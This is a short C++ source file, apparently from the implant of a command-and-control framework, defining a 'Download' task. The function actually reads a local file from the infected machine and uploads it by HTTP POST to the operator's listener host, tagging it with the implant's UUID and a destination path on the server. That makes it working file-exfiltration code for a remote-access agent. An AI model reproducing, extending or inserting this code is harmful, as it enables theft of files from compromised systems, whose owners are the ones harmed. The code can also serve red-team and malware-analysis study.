#include "core/task.hpp"

namespace Task
{
    std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest)
    {
        std::wstring wHeaders;
        System::Http::WinHttpResponse resp;

        // Read a local file.
        std::vector<char> byteData = System::Fs::ReadBytesFromFile(wSrc);

        // Set additional headers.
        // Specify the destination file path in the server-side.
        wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n" +  L"X-FILE: " + wDest + L"\r\n";

        resp = System::Http::SendRequest(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathUpload,
            L"POST",
            wHeaders.c_str(),
            (LPVOID)byteData.data(),
            (DWORD)byteData.size()
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return L"Error: Could not upload a file.";
        }

        return wDest.c_str();
    }
}